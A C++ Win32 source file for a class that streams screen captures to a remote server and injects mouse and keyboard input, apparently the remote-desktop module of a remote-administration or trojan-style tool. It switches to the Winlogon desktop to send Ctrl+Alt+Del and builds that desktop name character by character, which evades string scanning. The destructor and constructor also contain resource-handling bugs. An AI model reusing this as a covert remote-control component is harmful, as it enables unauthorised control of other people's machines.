// MyFrameTrans.cpp: implementation of the CMyFrameTrans class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "MyFrameTrans.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CMyFrameTrans::CMyFrameTrans()
{
	m_ImageCount = 50;

	m_FrameSize.cx = 0;
	m_FrameSize.cy = 0;
	m_PrevPoint.x = 0;
	m_PrevPoint.y = 0;

	dImageLen = 0;

	hCurBitmap = NULL;
	hBufBitmap = NULL;

	pSendPoint = NULL;
	pImagePoint = NULL;
	nImageCount = 0;
	nSendCount = 0;

	xImageCount = 0;
	yImageCount = 0;

	hSendDataEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	hSendDataMetux = CreateMutex(NULL, FALSE, NULL);

	m_IsFrameExit = FALSE;

	pBakImageData = NULL;
	pCurImageData = NULL;

	nLineBitLenDouble = 0;
	nLineBitLen = 0;

	pZipData = NULL;

	ZeroMemory(&m_BufBitmapInfo, sizeof(BITMAPINFO));
	ZeroMemory(&m_BitmapInfo, sizeof(BITMAPINFO));
}

CMyFrameTrans::~CMyFrameTrans()
{
	CloseHandle(hSendDataEvent);
	CloseHandle(hSendDataMetux);

	if(pBakImageData != NULL)
	{
		delete [] pBakImageData;
	}

	if(pCurImageData != NULL)
	{
		delete [] pCurImageData;
	}

	if(pSendPoint != NULL)
	{
		delete [] pSendPoint;
	}

	if(pImagePoint != NULL)
	{
		delete [] pImagePoint;
	}

	if(hBufBitmap != NULL)
	{
		DeleteObject(hBufBitmap);
	}

	if(hCurBitmap != NULL)
	{
		DeleteObject(hCurBitmap);
	}

	if(hTmpBitmap != NULL)
	{
		DeleteObject(hCurBitmap);
	}

	if(pStmBmp != NULL) 
	{
		pStmBmp->Release();
	}

	if(hMemBmp != NULL)	
	{
		GlobalFree(hMemBmp);
	}
}

void CMyFrameTrans::SendImage()
{
	while(1)
	{
		WaitForSingleObject(hSendDataEvent, 0xffffffff);
		ResetEvent(hSendDataEvent);
		WaitForSingleObject(hSendDataMetux, 0xffffffff);
		if(!SendData(&nSendCount, sizeof(DWORD)) || !SendData(pSendPoint, nSendCount * sizeof(PSPOINT))
			|| !SendData(&len.LowPart, sizeof(DWORD)) || !SendData(pZipData, len.LowPart))
		{
			ReleaseMutex(hSendDataMetux);
			break;
		}
		ReleaseMutex(hSendDataMetux);
	}
	m_IsFrameExit = TRUE;
}

void CMyFrameTrans::SendThread(LPVOID lPvoid)
{
	SetThreadAffinityMask(GetCurrentThread(), 0x0e);
	CMyFrameTrans* pThis = (CMyFrameTrans*) lPvoid;
	pThis->SendImage();
}

void CMyFrameTrans::GetFrameDataForSend()
{
	long l = nLineBitLenDouble / sizeof(long) / 2;
	long l2 = nLineBitLenDouble * 2;

	//开始循环发送屏幕数据
	while(!m_IsFrameExit)
	{
		//拷贝当前屏幕
		HDESK hOldDesktop = GetThreadDesktop(GetCurrentThreadId());
		HDESK hNewDesktop = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
		if(hNewDesktop != NULL)
		{
			SetThreadDesktop(hNewDesktop);
		}

		HDC hSrcDC = CreateDC("DISPLAY", NULL, NULL, NULL);
		HDC hCurDC = CreateCompatibleDC(hSrcDC);
		SelectObject(hCurDC, hCurBitmap);
		BitBlt(hCurDC, 0, 0, m_FrameSize.cx, m_FrameSize.cy, hSrcDC, 0, 0, SRCCOPY);
		DeleteDC(hSrcDC);
			
		HDC hBufDC = CreateCompatibleDC(hCurDC);
		SelectObject(hBufDC, hBufBitmap);

		HDC hTmpDC = CreateCompatibleDC(hCurDC);
		SelectObject(hTmpDC, hTmpBitmap);
		LPBYTE pOldImagePoint = pBakImageData;

		//取当前改变画面
		for(register int y = 0; y < yImageCount; y++)
		{
			for(register int x = 0; x < xImageCount; x++)
			{
				//取当前块内容
				BitBlt(hTmpDC, 0, 0, P_I_C, P_I_C, hCurDC, x * P_I_C, y * P_I_C, SRCCOPY);
				
				//取当前块图象数据
				GetDIBits(hTmpDC, hTmpBitmap, 0, P_I_C, pCurImageData, &m_BitmapInfo, DIB_RGB_COLORS);

				long* s = (long*) pCurImageData;
				long* d = (long*) pOldImagePoint;
				long i = m_BitmapInfo.bmiHeader.biHeight - x % 2;

				do
				{
					__asm
					{
						mov ebx, s
						mov edx, d
						mov ecx, l
					}

				xxx:
					__asm
					{
						mov eax, [ebx + ecx * 8 - 4]
						xor eax, [edx + ecx * 8 - 4]
						je yyy
					}

					// Diff
					CopyMemory(pOldImagePoint, pCurImageData, m_BitmapInfo.bmiHeader.biSizeImage);
					BitBlt(hBufDC, nImageCount * P_I_C, 0, P_I_C, P_I_C, hTmpDC, 0, 0, SRCCOPY);
					pImagePoint[nImageCount].x = x * P_I_C;
					pImagePoint[nImageCount].y = y * P_I_C;
					nImageCount ++;
					break;

				yyy:
				   // Same
					__asm
					{
						dec ecx
						jnz xxx
					}

					*(long *)&s += l2;
					*(long *)&d += l2;

				}while((i -= 2) > 0);
				pOldImagePoint += m_BitmapInfo.bmiHeader.biSizeImage;
			}
		}
		DeleteDC(hCurDC);
		DeleteDC(hTmpDC);

		if(nImageCount > 0)
		{
			HBITMAP hDesBitmap = CreateCompatibleBitmap(hBufDC, nImageCount * P_I_C, P_I_C);
			HDC hDesDC = CreateCompatibleDC(hBufDC);
			SelectObject(hDesDC, hDesBitmap);
			BitBlt(hDesDC, 0, 0, nImageCount * P_I_C, P_I_C, hBufDC, 0, 0, SRCCOPY);
			DeleteDC(hBufDC);
			DeleteDC(hDesDC);

			if(WaitForSingleObject(hSendDataMetux, 0xffffffff) == WAIT_OBJECT_0)
			{
				len.QuadPart = 0;
				pos.QuadPart = 0;
				pStmBmp->Seek(pos, STREAM_SEEK_SET, &len);
				Bitmap* pTmpBitmap = Bitmap::FromHBITMAP(hDesBitmap, NULL);
				pTmpBitmap->Save(pStmBmp, &eClsid, &eParameters);
				delete pTmpBitmap;
				DeleteObject(hDesBitmap);
				len.QuadPart = 0;
				pos.QuadPart = 0;
				pStmBmp->Seek(pos, STREAM_SEEK_CUR, &len);

				nSendCount = nImageCount;
				CopyMemory(pSendPoint, pImagePoint, sizeof(PSPOINT) * nSendCount);
				ReleaseMutex(hSendDataMetux);
			}
			SetEvent(hSendDataEvent);
			nImageCount = 0;
		}
		else
		{
			DeleteDC(hBufDC);
		}
		SetThreadDesktop(hOldDesktop);
		Sleep(50);
	}
}

BOOL CMyFrameTrans::StartWork(PSDLLINFO m_DllInfo)
{
	ULONG_PTR gdiplusToken = NULL;
	GdiplusStartupInput gdiplusStartupInput;
	GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

	//连接到服务器
	if(!Create(WM_CONNECT_FRAM, m_DllInfo))
	{
		return FALSE;
	}

	HDESK hOldDesktop = GetThreadDesktop(GetCurrentThreadId());
	HDESK hNewDesktop = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
	if(hNewDesktop != NULL)
	{
		SetThreadDesktop(hNewDesktop);
	}
	HDC hSrcDC = CreateDC("DISPLAY", NULL, NULL, NULL);

	//取屏幕分辨率
	m_FrameSize.cx = GetDeviceCaps(hSrcDC, HORZRES);
	m_FrameSize.cy = GetDeviceCaps(hSrcDC, VERTRES);
	DWORD nColor = GetDeviceCaps(hSrcDC, BITSPIXEL);

	if(m_FrameSize.cx % P_I_C == 0)
	{
		xImageCount = m_FrameSize.cx / P_I_C;
	}
	else
	{
		xImageCount = m_FrameSize.cx / P_I_C + 1;
	}

	if(m_FrameSize.cy % P_I_C == 0)
	{
		yImageCount = m_FrameSize.cy / P_I_C;
	}
	else
	{
		yImageCount = m_FrameSize.cy / P_I_C + 1;
	}
	pSendPoint = new PSPOINT[xImageCount * yImageCount];
	pImagePoint = new PSPOINT[xImageCount * yImageCount];
	
	hCurBitmap = CreateCompatibleBitmap(hSrcDC, m_FrameSize.cx, m_FrameSize.cy);
	hBufBitmap = CreateCompatibleBitmap(hSrcDC, xImageCount * yImageCount * P_I_C, P_I_C);
	hTmpBitmap = CreateCompatibleBitmap(hSrcDC, P_I_C, P_I_C);
	
	m_BitmapInfo.bmiHeader.biSize			= sizeof(BITMAPINFOHEADER);
	m_BitmapInfo.bmiHeader.biWidth			= P_I_C;
	m_BitmapInfo.bmiHeader.biHeight			= P_I_C;
	m_BitmapInfo.bmiHeader.biPlanes			= 1;
	m_BitmapInfo.bmiHeader.biBitCount		= (WORD) nColor;
	m_BitmapInfo.bmiHeader.biCompression	= BI_RGB;
	GetDIBits(hSrcDC, hTmpBitmap, 0, P_I_C, NULL, &m_BitmapInfo, DIB_RGB_COLORS);
	nLineBitLenDouble = m_BitmapInfo.bmiHeader.biSizeImage / P_I_C;
	nLineBitLen = nLineBitLenDouble / 2;
	CopyMemory(&m_BufBitmapInfo, &m_BitmapInfo, sizeof(BITMAPINFO));

	//压缩缓冲参数
	hMemBmp = GlobalAlloc(GMEM_FIXED, m_BitmapInfo.bmiHeader.biSizeImage * xImageCount * yImageCount);
	CreateStreamOnHGlobal(hMemBmp, FALSE, &pStmBmp);
	len.LowPart = m_BitmapInfo.bmiHeader.biSizeImage * xImageCount * yImageCount;
	pStmBmp->SetSize(len);
	pZipData = (BYTE*) GlobalLock(hMemBmp);

	pBakImageData = new BYTE[xImageCount * yImageCount * m_BitmapInfo.bmiHeader.biSizeImage];
	ZeroMemory(pBakImageData, xImageCount * yImageCount * m_BitmapInfo.bmiHeader.biSizeImage);
	pCurImageData = new BYTE[m_BitmapInfo.bmiHeader.biSizeImage];
	ZeroMemory(pCurImageData, m_BitmapInfo.bmiHeader.biSizeImage);

	//取当前屏幕拷贝
	HDC hCurDC = CreateCompatibleDC(hSrcDC);
	SelectObject(hCurDC, hCurBitmap);
	BitBlt(hCurDC, 0, 0, m_FrameSize.cx, m_FrameSize.cy, hSrcDC, 0, 0, SRCCOPY);
	DeleteDC(hSrcDC);

	HDC hTmpDC = CreateCompatibleDC(hCurDC);
	SelectObject(hTmpDC, hTmpBitmap);
	LPBYTE pOldImageData = pBakImageData;
	for(int y = 0; y < yImageCount; y++)
	{
		for(int x = 0; x < xImageCount; x++)
		{
			BitBlt(hTmpDC, 0, 0, P_I_C, P_I_C, hCurDC, x * P_I_C, y * P_I_C, SRCCOPY);
			GetDIBits(hTmpDC, hTmpBitmap, 0, P_I_C, pOldImageData, &m_BitmapInfo, DIB_RGB_COLORS);
			pOldImageData += m_BitmapInfo.bmiHeader.biSizeImage;
		}
	}
	DeleteDC(hCurDC);
	DeleteDC(hTmpDC);
	SetThreadDesktop(hOldDesktop);

	//接收初始化数据
	MYFRAMEINFO m_Info = {0};
	m_Info.m_Width = (WORD) m_FrameSize.cx;
	m_Info.m_Height = (WORD) m_FrameSize.cy;
	m_Info.m_RectSize = P_I_C;
	if(!SendData(&m_Info, sizeof(MYFRAMEINFO)))
	{
		return FALSE;
	}

	//压缩图象参数
	MyMainFunc::GetEncoderClsid(L"image/jpeg", &eClsid);
	eParameters.Count = 1;
	eParameters.Parameter[0].Guid = EncoderQuality;
	eParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
	eParameters.Parameter[0].NumberOfValues = 1;
	eParameters.Parameter[0].Value = &m_ImageCount;

	//压缩图象
	len.QuadPart = 0;
	pos.QuadPart = 0;
	pStmBmp->Seek(pos, STREAM_SEEK_SET, &len);
	Bitmap* pTmpBitmap = Bitmap::FromHBITMAP(hCurBitmap, NULL);
	pTmpBitmap->Save(pStmBmp, &eClsid, &eParameters);
	delete pTmpBitmap;
	len.QuadPart = 0;
	pos.QuadPart = 0;
	pStmBmp->Seek(pos, STREAM_SEEK_CUR, &len);

	if(!SendData(&len.LowPart, sizeof(DWORD)) || !SendData(pZipData, len.LowPart))
	{
		return FALSE;
	}

	HANDLE hThreadRecv = (HANDLE) _beginthread(RecvThread, 0, (LPVOID) this);
	HANDLE hThreadSend = (HANDLE) _beginthread(SendThread, 0, (LPVOID) this);
	
	SetThreadAffinityMask(GetCurrentThread(), 0x01);
	SetThreadAffinityMask(hThreadSend, 0x0e);
	SetThreadAffinityMask(hThreadRecv, 0x0e);

	//取数据发送
	GetFrameDataForSend();

	//关闭套接字
	Close();

	WaitForSingleObject(hThreadRecv, 1000);
	WaitForSingleObject(hThreadSend, 1000);
	TerminateThread(hThreadRecv, 0);
	TerminateThread(hThreadSend, 0);
	return TRUE;
}

void CMyFrameTrans::RecvCmd()
{
	MOUSEINFO m_MouseInfo = {0};
	while(1)
	{
		HDESK hOldDesktop = GetThreadDesktop(GetCurrentThreadId());
		HDESK hNewDesktop = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
		if(hNewDesktop != NULL)
		{
			SetThreadDesktop(hNewDesktop);
		}
		if(!RecvData(&m_MouseInfo, sizeof(MOUSEINFO)))
		{
			break;
		}
		if(m_MouseInfo.cmd == CMD_FRAME_MOUSE_STATE)
		{
			MoveCursor(&m_MouseInfo);
		}
		else if(m_MouseInfo.cmd == CMD_FRAME_KEY_STATE)
		{
			HitKeyState(&m_MouseInfo);
		}
		else if(m_MouseInfo.cmd == CMD_FRAME_KEY_ALL)
		{
			_beginthread(SendLogonInfoThread, 0, (LPVOID) this);
		}
		SetThreadDesktop(hOldDesktop);
	}
	m_IsFrameExit = TRUE;
}

void CMyFrameTrans::RecvThread(LPVOID lPvoid)
{
	CMyFrameTrans* pThis = (CMyFrameTrans*) lPvoid;
	pThis->RecvCmd();
}

inline void CMyFrameTrans::MoveCursor(LPMOUSEINFO pInfo)
{
	POINT Point;
	Point.x = pInfo->x;
	Point.y = pInfo->y;
	if(pInfo->state == MOUSEEVENTF_MOVE)
	{
		if(m_PrevPoint.x != 0 && m_PrevPoint.y != 0)
		{
			Point.x = abs(m_PrevPoint.x - pInfo->x);
			Point.y = abs(m_PrevPoint.y - pInfo->y);
			m_PrevPoint.x = pInfo->x;
			m_PrevPoint.y = pInfo->y;
		}
		else
		{
			m_PrevPoint = Point;
		}
	}
	INPUT m_InPut = {0};
	m_InPut.mi.dx = Point.x;
	m_InPut.mi.dy = Point.y;
	m_InPut.mi.dwFlags = pInfo->state;
	m_InPut.type = INPUT_MOUSE;
	SetCursorPos(pInfo->x, pInfo->y);
	SendInput(1, &m_InPut,sizeof(m_InPut));
}

inline void CMyFrameTrans::TypeKey(BYTE vk, DWORD dwFlag)
{
	INPUT input;
	input.type = INPUT_KEYBOARD;
	input.ki.wVk = vk;
	input.ki.wScan = vk;
	input.ki.dwFlags = dwFlag;
	input.ki.dwExtraInfo = NULL;
	input.ki.time = 0;
	SendInput(1, &input, sizeof(input));
}

inline void CMyFrameTrans::HitKeyState(LPMOUSEINFO pInfo)
{
	if(pInfo->x)
	{
		TypeKey(VK_SHIFT, 0);
	}
	else
	{
		TypeKey(VK_SHIFT, KEYEVENTF_KEYUP);
	}
	if(pInfo->y)
	{
		TypeKey(VK_CONTROL, 0);
	}
	else
	{
		TypeKey(VK_CONTROL, KEYEVENTF_KEYUP);
	}
	if(pInfo->state)
	{
		TypeKey(VK_MENU, 0);
	}
	else
	{
		TypeKey(VK_MENU, KEYEVENTF_KEYUP);
	}
	TypeKey(pInfo->ch, 0);
	TypeKey(pInfo->ch, KEYEVENTF_KEYUP);
}

void CMyFrameTrans::SendLogonInfoThread(LPVOID lPvoid)
{
	//Winlogon
	char m_TempStr[256] = {0};
	m_TempStr[0] = 'W';
	m_TempStr[1] = 'i';
	m_TempStr[2] = 'n';
	m_TempStr[3] = 'l';
	m_TempStr[4] = 'o';
	m_TempStr[5] = 'g';
	m_TempStr[6] = 'o';
	m_TempStr[7] = 'n';
	m_TempStr[8] = 0x00;

	HDESK hOldDesktop = GetThreadDesktop(GetCurrentThreadId());
	HDESK hNewDesktop = OpenDesktop(m_TempStr, 0, FALSE, MAXIMUM_ALLOWED);
	if(hNewDesktop != NULL)
	{
		SetThreadDesktop(hNewDesktop);
	}
	PostMessage(HWND_BROADCAST, WM_HOTKEY, 0, MAKELONG(MOD_ALT | MOD_CONTROL, VK_DELETE));
	SetThreadDesktop(hOldDesktop);
}

